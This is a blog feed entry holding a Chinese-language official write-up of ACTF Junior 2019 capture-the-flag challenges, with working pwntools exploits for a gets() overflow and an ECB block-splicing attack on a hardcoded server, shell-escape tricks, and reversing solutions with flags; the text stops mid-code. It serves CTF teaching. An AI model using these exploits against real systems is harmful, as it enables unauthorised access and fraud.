<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
	<title>LuckyDog | CSUwangj&#x27;s Blog - Misc</title>
	<link href="https://CSUwangj.github.io/tags/Misc/atom.xml" rel="self" type="application/atom+xml"/>
  <link href="https://CSUwangj.github.io/"/>
	<generator uri="https://www.getzola.org/">Zola</generator>
	<updated>2020-08-07T02:01:26.829857+08:00</updated>
	<id>https://CSUwangj.github.io/tags/Misc/atom.xml</id>
	<entry xml:lang="en">
		<title>ACTF Junior 2019 Official WriteUP of CSUWangj&#x27;s Challenge</title>
		<published>2019-02-28T15:55:24+08:00</published>
		<updated>2020-08-07T02:01:26.829857+08:00</updated>
		<link rel="alternate" href="https://CSUwangj.github.io/actf-junior-2019-official-writeup-of-csuwangj-s-challenge/" type="text/html"/>
		<id>https://CSUwangj.github.io/actf-junior-2019-official-writeup-of-csuwangj-s-challenge/</id>
		<content type="html">&lt;p&gt;日常出锅、、、&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;h1 id=&quot;linux-pwn&quot;&gt;Linux&amp;amp;PWN&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;vim&quot;&gt;vim&lt;&#x2F;h2&gt;
&lt;p&gt;首先要了解vim的几个模式&lt;&#x2F;p&gt;
&lt;p&gt;然后vim在普通模式下是可以执行Linux命令的，然后就可以ls, cat flag之类的了。&lt;&#x2F;p&gt;
&lt;p&gt;感谢各位没有把容器玩坏。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;no-more-gets1&quot;&gt;No_more_gets1&lt;&#x2F;h2&gt;
&lt;p&gt;查看&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;CSUwangj&#x2F;ACTF_Junior_2019&#x2F;blob&#x2F;master&#x2F;Linux%26PWN&#x2F;No_more_gets2&#x2F;src&#x2F;src.c&quot;&gt;源码&lt;&#x2F;a&gt;，问题出在&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;CSUwangj&#x2F;ACTF_Junior_2019&#x2F;blob&#x2F;master&#x2F;Linux%26PWN&#x2F;No_more_gets1&#x2F;src&#x2F;src.c#L140&quot;&gt;第140行（rigist()+12）&lt;&#x2F;a&gt;，passwdbuf在namebuf前面，所以gets的时候可以把namebuf覆盖掉，于是就能强行注册一个密码自己设定的admin。&lt;&#x2F;p&gt;
&lt;p&gt;一个可用的exp（来自给力的学弟）如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from pwn import *
import sys
# context.log_level=&amp;#x27;debug&amp;#x27;

if args[&amp;#x27;REMOTE&amp;#x27;]:
    sh = remote(sys.argv[1], sys.argv[2])
else:
    sh = process(&amp;quot;.&amp;#x2F;a.out&amp;quot;)

payload=0x10 * &amp;#x27;a&amp;#x27; + p64(0x0) + p64(0x555555555607)

sh.recvuntil(&amp;quot;6) Exit&amp;quot;)
sh.sendline(&amp;quot;3&amp;quot;)
#gdb.attach(sh)
#gdb.attach(sh)
sh.recvuntil(&amp;quot;Input your name&amp;quot;)
sh.sendline(&amp;#x27;father&amp;#x27;)
sh.recvuntil(&amp;#x27;Input your password&amp;#x27;)
sh.sendline(&amp;#x27;aaaaaaaaaaaaaaa\0admin\0&amp;#x27;)
sh.recvuntil(&amp;quot;6) Exit&amp;quot;)
sh.sendline(&amp;#x27;2&amp;#x27;)
sh.sendline(&amp;#x27;admin&amp;#x27;)
sh.sendline(&amp;#x27;aaaaaaaaaaaaaaa&amp;#x27;)
sh.sendline(&amp;#x27;4&amp;#x27;)
print sh.recvuntil(&amp;#x27;}&amp;#x27;)
sh.sendline(&amp;#x27;6&amp;#x27;)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;special-shell&quot;&gt;Special_Shell&lt;&#x2F;h2&gt;
&lt;p&gt;这个题是HGAME2018里看到的，感觉很有意思，YTB上有更详细的视频。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;CSUAuroraLab&#x2F;ACTF_Junior_2019&#x2F;blob&#x2F;master&#x2F;Linux%26PWN&#x2F;Special_Shell&#x2F;src&#x2F;src.c&quot;&gt;&lt;strong&gt;源码&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;有两个预期解，一方面来说，假如去阅读system()的&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;linux.die.net&#x2F;man&#x2F;3&#x2F;system&quot;&gt;手册&lt;&#x2F;a&gt;会看到&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Do not use &lt;strong&gt;system&lt;&#x2F;strong&gt;() from a program with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert system integrity. Use the &lt;em&gt;&lt;strong&gt;exec&lt;&#x2F;strong&gt;(3)&lt;&#x2F;em&gt; family of functions instead, but not &lt;em&gt;&lt;strong&gt;execlp&lt;&#x2F;strong&gt;(3)&lt;&#x2F;em&gt; or &lt;em&gt;&lt;strong&gt;execvp&lt;&#x2F;strong&gt;(3)&lt;&#x2F;em&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;如果去找一些可能的实现可能可以看到下面这样的&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;int system(const char *command)
{
    &amp;#x2F;* balabala *&amp;#x2F;
        execl(&amp;quot;&amp;#x2F;bin&amp;#x2F;sh&amp;quot;, &amp;quot;sh&amp;quot;, &amp;quot;-c&amp;quot;, command, (char *) NULL);
        _exit(127);                     &amp;#x2F;* We could not exec the shell *&amp;#x2F;

    &amp;#x2F;* balabala *&amp;#x2F;
    return status;
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;所以用&lt;code&gt;$0&lt;&#x2F;code&gt;是可以getshell的。&lt;&#x2F;p&gt;
&lt;p&gt;另一方面来说，&lt;code&gt;man bash&lt;&#x2F;code&gt;一下，了解一下&lt;code&gt;meta character in bash&lt;&#x2F;code&gt;，可以用&lt;code&gt;&#x2F;???&#x2F;?? .&lt;&#x2F;code&gt;得出目录，然后&lt;code&gt;&#x2F;???&#x2F;??? ????&lt;&#x2F;code&gt;看到flag。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;no-more-gets2&quot;&gt;No_more_gets2&lt;&#x2F;h2&gt;
&lt;p&gt;查看&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;CSUwangj&#x2F;ACTF_Junior_2019&#x2F;blob&#x2F;master&#x2F;Linux%26PWN&#x2F;No_more_gets2&#x2F;src&#x2F;src.c&quot;&gt;源码&lt;&#x2F;a&gt;，问题出在开始就莫名其妙的&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;CSUwangj&#x2F;ACTF_Junior_2019&#x2F;blob&#x2F;master&#x2F;Linux%26PWN&#x2F;No_more_gets2&#x2F;src&#x2F;src.c#L41&quot;&gt;输入用户名&lt;&#x2F;a&gt;。&lt;&#x2F;p&gt;
&lt;p&gt;只需要了解一下字节序、ascii码，这题就能解决了。&lt;&#x2F;p&gt;
&lt;h1 id=&quot;crypto&quot;&gt;Crypto&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;casear&quot;&gt;casear&lt;&#x2F;h2&gt;
&lt;p&gt;移位密码，加密时偏移量为+2，没有改变数字、大小写这几个属性&lt;&#x2F;p&gt;
&lt;p&gt;至于你说那么多人把数字改成字母、、、&lt;&#x2F;p&gt;
&lt;p&gt;算了，心累，这题提交失败超过20次的，线下逮到出题人请吃饭。。。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;fan-shu&quot;&gt;矾书&lt;&#x2F;h2&gt;
&lt;p&gt;就是把字符画的主体换成了白色字体保存成PDF。&lt;&#x2F;p&gt;
&lt;p&gt;大家还是很机灵的，顺便如果有个正好符合需求的PDF浏览器，这个题会解决得很快。&lt;&#x2F;p&gt;
&lt;p&gt;{% asset_img test.png %}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;fan-qie-ma&quot;&gt;反切码&lt;&#x2F;h2&gt;
&lt;p&gt;这里我偷了懒，并没有深入地考察这个东西、、、只需要百度就能找到出处，因为古音有八个读音，而现在只有四个，所以特地注明了一下用普通话来读。&lt;&#x2F;p&gt;
&lt;p&gt;（其实当时想吃的是火锅，但是缺声母来着）&lt;&#x2F;p&gt;
&lt;h2 id=&quot;tiny-rsa&quot;&gt;Tiny RSA&lt;&#x2F;h2&gt;
&lt;p&gt;就是一个非常非常naive的RSA，简易到可以用手算，希望大家对将要到来的&lt;strong&gt;段老师&lt;&#x2F;strong&gt;教授的密码学有所期待，段老师真的超好！&lt;&#x2F;p&gt;
&lt;p&gt;（貌似18级开始只有信安才有密码学，但是明明计算机相关的都应该学一点）&lt;&#x2F;p&gt;
&lt;h2 id=&quot;so-called-ecb&quot;&gt;So called ECB&lt;&#x2F;h2&gt;
&lt;p&gt;只要学到密码学的加密模式肯定会说到不要使用ECB的，而这里为了降低还特地把用户名、密码什么的分开加密再拼接，然而没有人做，感觉很不爽，不想给exp...&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from pwn import *
# context.log_level=&amp;#x27;debug&amp;#x27;

def regist(r, name, passwd):
	print &amp;quot;[*] Resitering Account&amp;quot;
	r.sendline(&amp;#x27;1&amp;#x27;)
	r.sendline(name)
	r.sendline(passwd)
	r.recvuntil(&amp;#x27;to {}&amp;#x27;.format(name))
	print &amp;quot;[+] Succeed&amp;quot;
	return r.recv()[2:130]

def transfer(r, name, passwd, to, amount):
	print &amp;quot;[*] Transferring&amp;quot;
	r.sendline(&amp;#x27;2&amp;#x27;)
	r.sendline(name)
	r.sendline(passwd)
	r.sendline(to)
	r.sendline(str(amount))
	r.recvuntil(&amp;#x27;to {}&amp;#x27;.format(to))
	print &amp;quot;[+] Succeed&amp;quot;
	return r.recv()[2:130]
	
r = remote(&amp;quot;47.107.33.15&amp;quot;, 45338)
name = &amp;#x27;a&amp;#x27;
passwd = &amp;#x27;a&amp;#x27;
admin = &amp;#x27;admin&amp;#x27;
payload = regist(r, name, passwd)[:96]
payload += transfer(r, name, passwd, admin, 1001)[96:128]
print &amp;quot;[*] Stealing money from admin&amp;quot;
for i in range(10):
	r.sendline(&amp;#x27;3&amp;#x27;)
	r.sendline(payload)
print &amp;quot;[+] Done&amp;quot;
print &amp;quot;[*] Querying flag&amp;quot;
r.sendline(&amp;#x27;5&amp;#x27;)
r.sendline(name)
r.sendline(passwd)
flag = r.recvuntil(&amp;quot;}&amp;quot;)
index = -1
try:
	index = flag.index(&amp;#x27;actf&amp;#x27;)
except:
	index = flag.index(&amp;#x27;ACTF&amp;#x27;)
flag = flag[index:]
print &amp;quot;[flag] {}&amp;quot;.format(flag)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;broken-random&quot;&gt;Broken Random&lt;&#x2F;h2&gt;
&lt;p&gt;这题毕竟源码都给了，要点也都提示到了，其实没什么难度。&lt;&#x2F;p&gt;
&lt;p&gt;直接的攻击点在于&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;CSUwangj&#x2F;ACTF_Junior_2019&#x2F;blob&#x2F;master&#x2F;Crypto&#x2F;Broken%20Random&#x2F;src&#x2F;src.c#L14&quot;&gt;srand(time(NULL))&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;srand()的效果是给rand()设置种子，问题就在于用&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;linux.die.net&#x2F;man&#x2F;2&#x2F;time&quot;&gt;time(NULL)&lt;&#x2F;a&gt;。&lt;&#x2F;p&gt;
&lt;p&gt;从文档里可以知道，time(NULL)返回从1970-01-01 00:00:00 +0000 (UTC)开始到现在的&lt;strong&gt;秒&lt;&#x2F;strong&gt;数。&lt;&#x2F;p&gt;
&lt;p&gt;所以至少有以下几种攻击方式：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;同时开两个terminal，同时nc一下就很有可能让两个程序用同一个种子，只需要读一个写一个就行。&lt;&#x2F;li&gt;
&lt;li&gt;把程序自己编译一遍，一边nc一边运行。&lt;&#x2F;li&gt;
&lt;li&gt;暴力猜一下服务器的时间。（本地暴力）。&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h2 id=&quot;rsa-lab&quot;&gt;RSA Lab&lt;&#x2F;h2&gt;
&lt;p&gt;RSA相关的小问答，没什么难度。实际上这个才是tiny RSA，之前那个算是趣味小游戏的程度:D&lt;&#x2F;p&gt;
&lt;h2 id=&quot;happybirthday&quot;&gt;HappyBirthday&lt;&#x2F;h2&gt;
&lt;p&gt;生日攻击啊、、、&lt;&#x2F;p&gt;
&lt;p&gt;听到有人说这个难度大，我已经把难度降低过了 ，原来的长度有56，60和64的、、、&lt;&#x2F;p&gt;
&lt;p&gt;50位的话，碰撞一次的代价大概是$2^{25}$。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;好的，前面一顿分析全当放屁，愚蠢的出题人想当然认为[:50]是前50位而忘记了那是十六进制的问题。所以正常难度应该是把代码改成[:13]或者[:12]。。。&lt;&#x2F;p&gt;
&lt;p&gt;EXP没什么好放的吧，就跑跑暴力的事情。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;non-cryptography-hash&quot;&gt;Non-cryptography Hash&lt;&#x2F;h2&gt;
&lt;p&gt;这个题是看起来难的其实一点也不难的题，因为它的值域一共就、、、那么多、、、&lt;&#x2F;p&gt;
&lt;p&gt;所以，不管是直接暴力，还是暴力建表然后查找，理论上都是可行的、、、&lt;&#x2F;p&gt;
&lt;h2 id=&quot;dian-ji-ying-xiong-1cun-dang-xiu-gai&quot;&gt;点击英雄1存档修改&lt;&#x2F;h2&gt;
&lt;p&gt;这个就不说了吧，也没有人问我，看起来都不想放弃游戏体验呢&lt;&#x2F;p&gt;
&lt;h1 id=&quot;forensics&quot;&gt;Forensics&lt;&#x2F;h1&gt;
&lt;p&gt;这部分题目我个人感觉解法是很多的，在我的认知里取证和渗透类似，不同的人不同的工具都会有不同的效果，而且可能都可以达成目的，这里的解答仅作参考，如果有什么特别的解法请&lt;a href=&quot;mailto:CSUwangj@protonmail.com&quot;&gt;告知我&lt;&#x2F;a&gt;，万分感激。&lt;&#x2F;p&gt;
&lt;p&gt;顺便这几个题对flag的字符串都没有做什么隐藏，所以除了一个人以外都是strings&#x2F;脱壳后strings解出来的，令出题人感到非常伤心，这根本不好玩嘛&lt;&#x2F;p&gt;
&lt;h2 id=&quot;popbox&quot;&gt;Popbox&lt;&#x2F;h2&gt;
&lt;p&gt;重定向输出流即可，cmd下可以直接&amp;gt;，powershell需要用Out-File。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;donothing&quot;&gt;DoNothing&lt;&#x2F;h2&gt;
&lt;p&gt;找程序，可以从启动项&#x2F;任务管理器里找到一个不一样svchost.exe。&lt;&#x2F;p&gt;
&lt;p&gt;接下来可以通过查看这个程序相关的活动找到输出文件，里面含有flag。&lt;&#x2F;p&gt;
&lt;p&gt;也可以直接查看系统里所有的IO&#x2F;网络&#x2F;注册表等的操作情况来查找。这里推荐一下微软的工具箱SysinternalSuite里的procmon。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;memory&quot;&gt;Memory&lt;&#x2F;h2&gt;
&lt;p&gt;flag放在程序的栈上面的，dump下来找一下就行了。&lt;&#x2F;p&gt;
&lt;p&gt;也可以直接在内存里找。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;wirefish&quot;&gt;WireFish&lt;&#x2F;h2&gt;
&lt;p&gt;WireShark抓一下就出来了&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;这条分割线以下不是我出的，代发一下&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;reverse&quot;&gt;Reverse&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;show-me-the-code&quot;&gt;show me the code&lt;&#x2F;h2&gt;
&lt;p&gt;我们只看比较关键的给出的代码：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;for (int i = 1; keystr[i]; i++) {
		keystr[i] ^= keystr[i-1];
		keystr[i] += 2;
	}
...
if(!strcmp(keystr,enstr)){
    ...
}
else{
    ...
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;用户的输入在经过for循环的操作之后与enstr字符串比对，若相同则提示输入正确，所以我们要做的就是从给出的enstr字符串和for循环里的操作来__逆推__出正确的输入应该是怎样的。&lt;&#x2F;p&gt;
&lt;p&gt;for循环里从第1位字符开始每个字符异或上一位的字符之后加2，加的逆操作是减，而异或的逆操作则是再次异或相同的数，比如说(a^b)^b = a ，所以我们的逆操作应该是从enstr最后一位字符开始，每一位先减2再异或前一位，循环至第1位，代码如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;## include&amp;lt;stdio.h&amp;gt;

int main(){
    char enstr[]={0x41,0x04,0x52,0x16,0x6f,0x3a,0x10,0x23,0x42,0x74,0x1b,0x31,0x70,0x49,0x7b,0x26,0x56,0x64,0x3d,0x4c,0x7e,0x0e,0x41,0x27,0x08,0x77};
    for(int j=25;j&amp;gt;=1;j--){
		enstr[j] -= 2;
		enstr[j] ^= enstr[j-1];
	}
	printf(&amp;quot;%s&amp;quot;,enstr);
    return 0;
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;得到flag：&lt;strong&gt;ACTF{W41c0m4_70_r4_w0r1d!}&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;shi-wo-idala&quot;&gt;食我ida啦&lt;&#x2F;h2&gt;
&lt;p&gt;这一题主要是想做一个工具使用的引导，如题所说需要掌握ida的一个最基本的用法，即反编译二进制文件后找到主函数，按下F5查看c代码。&lt;&#x2F;p&gt;
&lt;p&gt;在这一题里做到这一步就能直观地取得flag：&lt;strong&gt;ACTF{L15e_1da_d0_rEveR53}&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;（由于出题人图样，flag直接明文存放，可以直接放到二进制编辑器中搜索到flag的大部分。挨打×1）&lt;&#x2F;p&gt;
&lt;h2 id=&quot;simple-packer&quot;&gt;simple packer&lt;&#x2F;h2&gt;
&lt;p&gt;壳是程序本身为了达成防护或者减小体积的一种手段，根据目的不同分为加密壳和压缩壳。加了壳的程序无法直接进行逆向分析，一般的应对手段是脱壳。&lt;&#x2F;p&gt;
&lt;p&gt;本题采用的壳是upx 2.03，属于压缩壳中比较常见的一种。对于这种壳不需要自己手动脱壳，借助&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;15P9RMXuitwS3CBl3PFVlig&quot;&gt;工具&lt;&#x2F;a&gt;(提取码a8rs)可以完成脱壳的工作。本题主要的目的也是让入门的同学们认识到脱壳这一过程，脱完壳后使用ida进行分析可以直接拿到flag：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;ACTF{L15e_1da_d0_rEveR53}&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;有关壳的其他相关知识感兴趣的同学可以接下来前往吾爱破解等安全相关论坛学习，里面有丰富的资料。&lt;&#x2F;p&gt;
&lt;p&gt;（由于出题人再次图样，flag又直接明文存放，之前提到的操作可以搜索到完整的flag。绝赞挨打中qwq）&lt;&#x2F;p&gt;
&lt;h2 id=&quot;simple-asm&quot;&gt;simple asm&lt;&#x2F;h2&gt;
&lt;p&gt;根据给出的c代码我们可以知道这整个程序的流程很简单，要求输入flag后，把输入传入func函数，以func函数的返回值判断用户输入的是否为正确的flag，所以现在要做的就是分析func函数的功能从而解出flag。接下来开始一步步分析给出的func函数的汇编码：&lt;&#x2F;p&gt;
&lt;p&gt;最开始的这一段分析需要掌握栈帧以及函数调用约定的相关知识，这里直接给出分析的结果：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;assembly&quot; class=&quot;language-assembly &quot;&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;   0x0006fa &amp;lt;+0&amp;gt;:	push   rbp
   0x0006fb &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x0006fe &amp;lt;+4&amp;gt;:	mov    QWORD PTR [rbp-0x18],rdi
   0x000702 &amp;lt;+8&amp;gt;:	mov    DWORD PTR [rbp-0x4],0x0
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;在simple.c中我们知道有这样一个调用：&lt;code&gt;func(input)&lt;&#x2F;code&gt; ，而上面的汇编代码实现的是将参数&lt;code&gt;input&lt;&#x2F;code&gt;的地址保存到&lt;code&gt;[rbp-0x18]&lt;&#x2F;code&gt;这个地方。之后&lt;code&gt;[rbp-0x4]&lt;&#x2F;code&gt;则作为一个局部变量，为其赋值为&lt;code&gt;0x0&lt;&#x2F;code&gt;。到这里我们可以尝试还原一下c代码：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;int func(char *input){
    int i=0x0;
    ...
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;我们将&lt;code&gt;[rbp-0x4]&lt;&#x2F;code&gt;假设为int型变量i，&lt;code&gt;[rbp-0x18]&lt;&#x2F;code&gt;假设为指向用户输入字符串首地址的指针input，往后看:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;assembly&quot; class=&quot;language-assembly &quot;&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt; 0x000709 &amp;lt;+15&amp;gt;:	jmp    0x75d &amp;lt;func+99&amp;gt;
 ...
 0x00075d &amp;lt;+99&amp;gt;:	cmp    DWORD PTR [rbp-0x4],0x15
 0x000761 &amp;lt;+103&amp;gt;:	jle    0x70b &amp;lt;func+17&amp;gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;跳转到&amp;lt;func+99&amp;gt;后将&lt;code&gt;[rbp-0x4]&lt;&#x2F;code&gt;中的值（也就是i）与&lt;code&gt;0x15&lt;&#x2F;code&gt;比较，只要不大于&lt;code&gt;0x15&lt;&#x2F;code&gt;就会跳转到&amp;lt;func+17&amp;gt;处。因为i的初值为&lt;code&gt;0x0&lt;&#x2F;code&gt;，所以会实现跳转。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;assembly&quot; class=&quot;language-assembly &quot;&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt; 0x00070b &amp;lt;+17&amp;gt;:	mov    eax,DWORD PTR [rbp-0x4]
 0x00070e &amp;lt;+20&amp;gt;:	movsxd rdx,eax
 0x000711 &amp;lt;+23&amp;gt;:	mov    rax,QWORD PTR [rbp-0x18]
 0x000715 &amp;lt;+27&amp;gt;:	add    rax,rdx
 0x000718 &amp;lt;+30&amp;gt;:	movzx  edx,BYTE PTR [rax]
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;根据先前的假设，前四行相当于完成了&lt;code&gt;(input+i)&lt;&#x2F;code&gt;,使input指向第i位字符；再看最后的&lt;code&gt;movzx  edx,BYTE PTR [rax]&lt;&#x2F;code&gt;,这里实现了寻址到&lt;code&gt;(input+i)&lt;&#x2F;code&gt;所表示的地址处并将此地址内存储的值传给edx，写成伪c代码相当于&lt;code&gt;edx = *(input + i)&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;assembly&quot; class=&quot;language-assembly &quot;&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt; 0x00071b &amp;lt;+33&amp;gt;:	mov    eax,DWORD PTR [rbp-0x4]
 0x00071e &amp;lt;+36&amp;gt;:	movsxd rcx,eax
 0x000721 &amp;lt;+39&amp;gt;:	mov    rax,QWORD PTR [rbp-0x18]
 0x000725 &amp;lt;+43&amp;gt;:	add    rax,rcx
 0x000728 &amp;lt;+46&amp;gt;:	add    edx,0x7
 0x00072b &amp;lt;+49&amp;gt;:	mov    BYTE PTR [rax],dl
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这里是比较关键的一个点，前四行进行的是与上一段相同的工作，到了第五行出现了使&lt;code&gt;edx&lt;&#x2F;code&gt;的值加7的操作，而在之前的分析中此时&lt;code&gt;edx&lt;&#x2F;code&gt;中存放的是&lt;code&gt;*(input+i)&lt;&#x2F;code&gt;，最后一行则是将加7之后的结果赋给原&lt;code&gt;(input+i)&lt;&#x2F;code&gt;的地址处。综上，上面的两段汇编实现了:  &lt;code&gt; *(input+i) += 7&lt;&#x2F;code&gt;，继续往下看：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;assembly&quot; class=&quot;language-assembly &quot;&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;   0x00072d &amp;lt;+51&amp;gt;:	mov    eax,DWORD PTR [rbp-0x4]
   0x000730 &amp;lt;+54&amp;gt;:	movsxd rdx,eax
   0x000733 &amp;lt;+57&amp;gt;:	mov    rax,QWORD PTR [rbp-0x18]
   0x000737 &amp;lt;+61&amp;gt;:	add    rax,rdx
   0x00073a &amp;lt;+64&amp;gt;:	movzx  ecx,BYTE PTR [rax]
   0x00073d &amp;lt;+67&amp;gt;:	mov    eax,DWORD PTR [rbp-0x4]
   0x000740 &amp;lt;+70&amp;gt;:	movsxd rdx,eax
   0x000743 &amp;lt;+73&amp;gt;:	lea    rax,[rip+0x2008f6]        ##  0x201040 &amp;lt;enstr&amp;gt;
   0x00074a &amp;lt;+80&amp;gt;:	movzx  eax,BYTE PTR [rdx+rax*1]
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;前5行做的是一样的事，写成伪代码就是 &lt;code&gt;ecx = *(input + i)&lt;&#x2F;code&gt; ; 之后2行则为&lt;code&gt;rdx = i&lt;&#x2F;code&gt;; 最后2行比较关键，&lt;code&gt;lea    rax,[rip+0x2008f6]&lt;&#x2F;code&gt;所做的是将simple.c中给出的字符数组&lt;code&gt;enstr&lt;&#x2F;code&gt;的首地址存入&lt;code&gt;rax&lt;&#x2F;code&gt;，而后综合前面的分析可以得出伪代码&lt;code&gt; eax = *(enstr + i)&lt;&#x2F;code&gt;，之后是比较和跳转操作：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;assembly&quot; class=&quot;language-assembly &quot;&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;   0x00074e &amp;lt;+84&amp;gt;:	cmp    cl,al
   0x000750 &amp;lt;+86&amp;gt;:	je     0x759 &amp;lt;func+95&amp;gt;
   0x000752 &amp;lt;+88&amp;gt;:	mov    eax,0x1
   0x000757 &amp;lt;+93&amp;gt;:	jmp    0x768 &amp;lt;func+110&amp;gt;
   0x000759 &amp;lt;+95&amp;gt;:	add    DWORD PTR [rbp-0x4],0x1
   0x00075d &amp;lt;+99&amp;gt;:	cmp    DWORD PTR [rbp-0x4],0x15
   0x000761 &amp;lt;+103&amp;gt;:	jle    0x70b &amp;lt;func+17&amp;gt;
   0x000763 &amp;lt;+105&amp;gt;:	mov    eax,0x0
   0x000768 &amp;lt;+110&amp;gt;:	pop    rbp
   0x000769 &amp;lt;+111&amp;gt;:	ret
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;由之前的分析可以很容易看懂这里第一行的&lt;code&gt;cmp&lt;&#x2F;code&gt;操作:&lt;code&gt;*(input + i)&lt;&#x2F;code&gt;与&lt;code&gt;*(enstr + i)&lt;&#x2F;code&gt;比对（此时&lt;code&gt;*(input + i)&lt;&#x2F;code&gt;已经经过了加7的操作），相等则跳转到&amp;lt;func+95&amp;gt;继续执行，i的值加1，又进入&amp;lt;func+99&amp;gt;处的判断（可知这里应该是个while循环），直到i的值大于0x15后，给&lt;code&gt;eax&lt;&#x2F;code&gt;赋0，即此函数的返回值将为0，退回栈帧后返回；不相等则给&lt;code&gt;eax&lt;&#x2F;code&gt;赋1，即此函数的返回值将为1，跳转到&amp;lt;func+110&amp;gt;退回栈帧后返回。综合所有分析，完成c代码的还原:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;int func(unsigned char *input){
	for(int i=0;i&amp;lt;=21;i++){
